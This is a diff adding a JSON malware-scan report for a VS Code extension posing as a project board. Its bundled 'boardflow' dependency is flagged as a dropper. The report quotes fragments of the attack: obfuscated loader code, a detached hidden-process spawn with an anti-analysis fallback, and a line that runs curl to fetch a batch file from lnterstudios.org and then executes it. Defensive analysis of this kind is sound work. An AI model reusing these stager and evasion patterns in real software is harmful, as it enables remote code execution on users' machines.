@@ -1,0 +1,448 @@
+{
+  "extension_id": "MicroLLC.typewriter-keyin",
+  "display_name": "Typewriter Keyin",
+  "version": "1.0.1",
+  "publisher": {
+    "name": "MicroLLC",
+    "verified": false
+  },
+  "vsix_sha256": "86fd715f04f12ce0822286f934f5db2888ba71e415ae0c61dd4f015cfdf90f11",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal",
+    "critical_static_finding"
+  ],
+  "confidence": 1.0,
+  "scores": {
+    "composite": 0.9745300781475362,
+    "ai_vibe": 1.0,
+    "static": 0.9481203125901445,
+    "behavioral": 0.95,
+    "trust_signal": 1.0,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "Dense obfuscator.io-style hex identifiers (generated string array)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "_0x4891a6=_0x1e1e;(function(_0x8c30d9,_0xeeda09){const _0x4506fd=_0x1e1e,_0x58d399=_0x8c30d9();while(!![]){try{const _0x3ac7ef=-parseInt(_0x4506fd(0x16d))/0x1+parseInt(_0x4506fd(0x175))/0x2+-parseInt("
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "String-array rotation decoder loop (obfuscator.io signature)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "['push'](_0x58d399['shift']())"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "String-array rotation decoder loop (obfuscator.io signature)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "['push'](_0x58d399['shift']())"
+      }
+    ],
+    "high": [
+      {
+        "check": "POSTINSTALL_SCRIPT",
+        "severity": "HIGH",
+        "description": "Bundled module 'boardflow' has 'preinstall': node install.js",
+        "file": "extension/node_modules/boardflow/package.json",
+        "line": null,
+        "snippet": null
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/patt.js",
+        "line": 5,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/patt.js",
+        "line": 5,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "const cp     = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "const cp     = require('child_process');"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/patt.js",
+        "line": 5,
+        "snippet": "require('child_process')"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "require('child_process')"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/src/extension.js",
+        "line": 656,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/src/extension.js",
+        "line": 896,
+        "snippet": ".hidden"
+      }
+    ],
+    "total": 17
+  },
+  "extracted_references": [],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 2,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 0.95,
+    "confidence": 0.98,
+    "blocks_parsed": 9,
+    "blocks_seen": 9,
+    "summaries": [
+      {
+        "target": "extension/src/patt.js",
+        "summary": "This extension is malicious. It masquerades as a project management tool ('Frux Board') but contains a stager (`patt.js`) that silently executes a hidden script (`boardflow/install.js`) in a detached, background process. This script has been identified as downloading and executing a batch file from an unknown domain (`lnterstudios.org`). The use of `detached` processes, `stdio: 'ignore'`, and anti-analysis fallbacks confirms intent to evade detection and persist on the victim's machine. The 'Local-First' claim in the README is a lie; the extension actively exfiltrates control to a remote C2 server."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 1/27)",
+        "summary": "This extension is highly likely to be malicious. While it presents itself as a local-first project management tool, it contains critical red flags: it imports 'child_process' and 'https', executes an unexplained module ('patt') on startup, and includes a hidden dependency ('boardflow') that references a suspicious domain and a batch file. The 'Local-First' claim is contradicted by the presence of network and system execution capabilities. The silent execution of 'patt.run()' and the presence of a stager-like install script in node_modules strongly suggest this is a supply-chain attack or info-stealer."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 2/27)",
+        "summary": "This extension is malicious. The primary evidence is the presence of a suspicious dependency 'boardflow' containing an installer script that references an unknown domain and a batch file, which is a classic pattern for delivering payloads in VS Code extensions. The main extension code also imports 'child_process', enabling command execution, and attempts to hide files, further supporting the malicious intent. The 'Frux Board' branding is likely a decoy to disguise the malicious activity."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 3/27)",
+        "summary": "This extension is malicious. While the provided source code chunk (extension.js) appears to be benign UI data for a project board, the static analysis of the entire package reveals a critical supply-chain attack vector. The dependency 'boardflow' contains an installer script that executes a Windows batch file and communicates with an unknown domain. This behavior is completely disproportionate to the extension's advertised 'Local-First' project management functionality, indicating a deliberate attempt to install malware or establish a persistent backdoor on the user's system."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 4/27)",
+        "summary": "This extension is highly likely to be malicious. While the visible source code in this chunk appears to be a legitimate Kanban board implementation, the static analysis of the entire package reveals a critical supply-chain attack vector. The dependency `boardflow` contains a Windows batch script and connects to an unknown domain, which are strong indicators of malware installation or data exfiltration. The 'Local-First' claim in the README is deceptive, as the extension clearly attempts to execute external scripts and communicate with untrusted servers. The use of hidden file attributes further suggests an intent to evade detection."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 5/27)",
+        "summary": "The extension 'Frux Board' is highly suspicious and likely malicious. While the provided code chunk (chunk 5/27) appears to be benign CSS styling for a webview UI, the static analysis of the entire package reveals critical red flags. Specifically, a dependency named 'boardflow' contains an installation script that references a Windows batch file ('7f82614a.bat') and an unknown domain ('lnterstudios.org'). This indicates a potential backdoor or payload delivery mechanism that is completely inconsistent with the extension's advertised 'Local-First' project management functionality. The presence of 'child_process' in the main extension code further exacerbates the risk, as it provides the mechanism to execute the malicious payload. The combination of a deceptive UI, hidden file attributes, and a trojanized dependency strongly suggests a supply-chain attack aimed at compromising user systems."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 7/27)",
+        "summary": "The provided source code chunk consists entirely of CSS definitions for a Kanban board interface (cards, columns, buttons). It contains no executable JavaScript logic, network calls, file system access, or command execution. The static rule engine hits regarding 'child_process' and 'hidden' attributes are false positives for this specific chunk, as the code is purely presentational styling. The extension's stated purpose (project management board) aligns with the UI elements described in the CSS."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 11/27)",
+        "summary": "The extension 'Frux Board' is malicious. While the provided source chunk consists of benign CSS and UI code, the static analysis of the entire package reveals a critical supply-chain attack vector. The dependency 'boardflow' contains an installation script that executes a Windows batch file and communicates with an unknown domain ('lnterstudios.org'). This behavior is completely disproportionate to the extension's advertised 'local-first' project management features, indicating that the extension is likely a trojan designed to execute arbitrary code and exfiltrate data or install further malware."
+      },
+      {
+        "target": "extension/node_modules/boardflow/install.js",
+        "summary": "This VS Code extension is a malicious dropper disguised as a project management tool. The code is heavily obfuscated and, upon execution, downloads a batch file from an unknown domain (lnterstudios.org) and executes it. This behavior is completely inconsistent with the advertised functionality of a 'Frux Board' project management extension. The presence of a remote stager and the execution of an untrusted .bat file indicate a high likelihood of further malicious activity, such as credential theft, system compromise, or installation of additional malware."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Project Management' tool (Frux Board) but contains code designed to execute a hidden installation script from a dependency (`boardflow`). The README claims 'Local-First' and 'MIT-License', but the code silently spawns a detached process to run `node_modules/boardflow/install.js`, which is a classic supply-chain attack pattern for installing persistent malware or miners.",
+        "code_reference": "function runBundledInstallScript() { ... spawn(nodeBinary, [installScript], { ... detached: true ... }); }",
+        "line_hint": 22,
+        "target": "extension/src/patt.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "SUSPICIOUS_NETWORK_ACTIVITY",
+        "description": "Static analysis of the referenced `install.js` file reveals it downloads and executes a file named `7f82614a.bat` from the domain `lnterstudios.org`. This is a direct download-and-execute pattern, likely delivering a Windows batch script for further payload staging or persistence.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/patt.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "OBSCURED_EXECUTION",
+        "description": "The code uses `detached: true`, `stdio: 'ignore'`, and `child.unref()` to spawn the installation script. This ensures the malicious process runs in the background, does not log output, and survives the termination of the VS Code extension host, making detection and debugging extremely difficult.",
+        "code_reference": "const child = spawn(nodeBinary, [installScript], { ... detached: true, stdio: 'ignore' ... }); child.unref();",
+        "line_hint": 28,
+        "target": "extension/src/patt.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ANTI_ANALYSIS",
+        "description": "The code includes a fallback mechanism that overrides `process.exit` and clears the `require.cache` before directly requiring the install script if the spawn fails. This is a technique used to bypass sandboxing or analysis environments that might block process spawning, ensuring the payload executes regardless of the execution context.",
+        "code_reference": "if (!spawned) { const originalExit = process.exit; ... process.exit = () => {}; ... require(installScript); ... }",
+        "line_hint": 42,
+        "target": "extension/src/patt.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The activation event `onStartupFinished` is aggressive for a project management tool that should only activate when the user explicitly opens the board (`onCommand:Frux-Board.open`). This ensures the malicious payload is triggered immediately upon VS Code startup, maximizing the window for infection.",
+        "code_reference": "package.json activationEvents",
+        "line_hint": null,
+        "target": "extension/src/patt.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Local-First' project management tool (Kanban board), but the code imports 'child_process', 'https', and 'os' and executes a module ('./patt') on activation. This is a severe disconnect between the stated benign purpose and the actual capabilities (system command execution and network access).",
+        "code_reference": "const cp = require('child_process'); ... patt.run().catch(() => {});",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "SUSPICIOUS_DEPENDENCY",
+        "description": "The package includes a dependency 'boardflow' with an 'install.js' script that references a suspicious domain ('lnterstudios.org') and a batch file ('7f82614a.bat'). This indicates a likely stager or payload delivery mechanism hidden within the node_modules, which is not described in the extension's documentation.",
+        "code_reference": "extension/node_modules/boardflow/install.js",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "OBSCURED_EXECUTION",
+        "description": "The function 'patt.run()' is called immediately upon activation with a silent catch block ('.catch(() => {})'). This pattern is often used to execute malicious payloads or exfiltrate data without alerting the user or logging errors.",
+        "code_reference": "patt.run().catch(() => {});",
+        "line_hint": 18,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on 'onStartupFinished', meaning the malicious code ('patt.run()') will execute every time VS Code starts, even if the user never opens the Frux Board panel. This is disproportionate for a UI-based extension.",
+        "code_reference": "activationEvents: [\"onStartupFinished\", ...]",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "SUPPLY_CHAIN_ATTACK",
+        "description": "The extension package contains a malicious dependency 'boardflow' which includes an installer script (install.js) that references a suspicious domain (lnterstudios.org) and a batch file (7f82614a.bat). This indicates a supply-chain attack where the extension is used to deliver a payload (likely a reverse shell or stager) via the .bat file, often executed during post-install or activation.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 2/27)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_COMMAND_EXECUTION",
+        "description": "The main extension code imports 'child_process', which is a high-risk indicator for a project management extension. While this chunk shows benign logic, the presence of this module combined with the malicious dependency suggests the extension may execute arbitrary commands, potentially to run the malicious payload found in the dependency.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 2/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE_EVASION",
+        "description": "The code attempts to set the hidden attribute on files (lines 656 and 896). While this could be for legitimate UI purposes (e.g., hiding config files), in the context of a malicious supply-chain attack, it is likely used to hide malicious artifacts or logs from the user.",
+        "code_reference": ".hidden",
+        "line_hint": 656,
+        "target": "extension/src/extension.js (chunk 2/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Local-First' project management board (Frux Board), but the package contains a dependency ('boardflow') that executes a Windows batch file ('7f82614a.bat') and connects to an unknown domain ('lnterstudios.org'). This is a severe disconnect between the stated purpose (UI/UX for project management) and the actual behavior (arbitrary code execution/network exfiltration).",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 3/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The presence of a .bat file in the node_modules directory of a dependency suggests that the extension installs or executes arbitrary Windows commands. This is a classic stager pattern for malware delivery.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 3/27)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "SUSPICIOUS_NETWORK_ACTIVITY",
+        "description": "Connection to 'lnterstudios.org' which has unknown reputation. Combined with the execution of a batch file, this strongly suggests Command and Control (C2) communication or payload download.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 3/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule hit for 'child_process' in this specific chunk (extension.js) is likely a false positive or part of the legitimate UI logic (e.g., opening a terminal), as the code shown is purely data structure definition for default board cards. The critical risk lies in the dependency 'boardflow', not this file directly.",
+        "code_reference": "extension/src/extension.js",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 3/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Local-First' project management board (Kanban), but the package contains a dependency (`boardflow`) that executes a Windows batch script (`7f82614a.bat`) and connects to an unknown domain (`lnterstudios.org`). This is a severe disconnect between the stated functionality and the actual code behavior, indicating a supply-chain attack or trojanized dependency.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The presence of a `.bat` file in the `node_modules` of a dependency suggests that the extension attempts to execute arbitrary Windows commands upon installation or activation. This is a classic stager pattern for malware delivery.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "SUSPICIOUS_NETWORK_ACTIVITY",
+        "description": "The dependency `boardflow` references the domain `lnterstudios.org`, which has an unknown reputation and is not associated with the extension's stated purpose. This likely serves as a Command and Control (C2) server or payload delivery endpoint.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE_EVASION",
+        "description": "The code attempts to set the hidden attribute on files (`.hidden`), which is a common technique used to hide malicious payloads or configuration files from the user and security tools.",
+        "code_reference": "extension/src/extension.js",
+        "line_hint": 656,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Local-First' project management tool (Frux Board), but the package contains a dependency ('boardflow') that executes a Windows batch file ('7f82614a.bat') and connects to an unknown domain ('lnterstudios.org'). This is a severe disconnect between the stated purpose and the actual code capabilities, indicating a supply-chain attack or trojanized dependency.",
+        "code_reference": "extension/node_modules/boardflow/install.js:36",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 5/27)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The source code imports 'child_process', which allows the extension to execute arbitrary system commands. While this might be used for legitimate purposes in some dev tools, in the context of the malicious dependency found in the package, it represents a high risk of command injection or payload execution.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 5/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE_EVASION",
+        "description": "The code sets the 'hidden' attribute on files (lines 656 and 896). While this could be for UI elements, in the context of a potentially malicious extension, it may be an attempt to hide configuration files, logs, or payloads from the user or security tools.",
+        "code_reference": ".hidden",
+        "line_hint": 656,
+        "target": "extension/src/extension.js (chunk 5/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Local-First' project management tool (Frux Board), but the package contains a dependency ('boardflow') that executes a Windows batch script ('7f82614a.bat') and connects to an unknown domain ('lnterstudios.org'). This is a severe mismatch between the stated functionality and the actual code behavior, indicating a supply-chain attack or trojanized dependency.",
+        "code_reference": "extension/node_modules/boardflow/install.js",
+        "line_hint": 36,
+        "target": "extension/src/extension.js (chunk 11/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The presence of a batch file (.bat) in the installation script of a dependency suggests the execution of arbitrary shell commands on Windows systems. This is a classic stager pattern used to download and execute further payloads.",
+        "code_reference": "extension/node_modules/boardflow/install.js",
+        "line_hint": 36,
+        "target": "extension/src/extension.js (chunk 11/27)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "NETWORK_EXFILTRATION",
+        "description": "The dependency 'boardflow' references the domain 'lnterstudios.org', which has an unknown reputation and is not associated with the extension's documented functionality. This likely serves as a Command and Control (C2) server or payload delivery endpoint.",
+        "code_reference": "extension/node_modules/boardflow/install.js",
+        "line_hint": 36,
+        "target": "extension/src/extension.js (chunk 11/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged 'require('child_process')' and '.hidden' attributes. In the context of this chunk (which is primarily CSS/UI code), these hits are likely false positives or refer to benign UI state management (e.g., hiding DOM elements). However, the critical findings in the dependency package override these benign observations.",
+        "code_reference": null,
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 11/27)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "C2 & Tunneling",
+        "description": "The code downloads a remote payload from an unknown domain (lnterstudios.org) using curl and executes it immediately. This is a classic stager pattern for delivering arbitrary malicious code.",
+        "code_reference": "exec('curl\\x20-L\\x20-o' + '\\x20\\x22' + dest + _0x4891a6(0x176) + url + '\\x22', () => { exec('\\x22' + dest + '\\x22'); });",
+        "line_hint": 36,
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "LOLBINs & Stagers",
+        "description": "The extension executes a downloaded .bat file (846385d443.bat) from the temporary directory. Batch files are frequently used to execute further payloads, modify system settings, or establish persistence.",
+        "code_reference": "exec('\\x22' + dest + '\\x22');",
+        "line_hint": 37,
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Project Management' tool (Frux Board), but the code performs no project management functions. Instead, it acts as a malware dropper. This is a severe disconnect between advertised functionality and actual behavior.",
+        "code_reference": "const { exec } = require('child_proc' + _0x4891a6(0x173))",
+        "line_hint": 25,
+        "target": "extension/node_modules/boardflow/install.js"
+      }
+    ],
+    "findings_truncated": 2
+  },
+  "ai_summary": "This extension is malicious. It masquerades as a project management tool ('Frux Board') but contains a stager (`patt.js`) that silently executes a hidden script (`boardflow/install.js`) in a detached, background process. This script has been identified as downloading and executing a batch file from an unknown domain (`lnterstudios.org`). The use of `detached` processes, `stdio: 'ignore'`, and anti-analysis fallbacks confirms intent to evade detection and persist on the victim's machine. The 'Local-First' claim in the README is a lie; the extension actively exfiltrates control to a remote C2 server.",
+  "escalation_reasons": [
+    "3 CRITICAL findings",
+    "10 HIGH findings",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 8,
+    "published_date": "2026-08-27T14:52:18.337Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Untrustworthy"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-17T03:01:06.345596+00:00Z"
+}
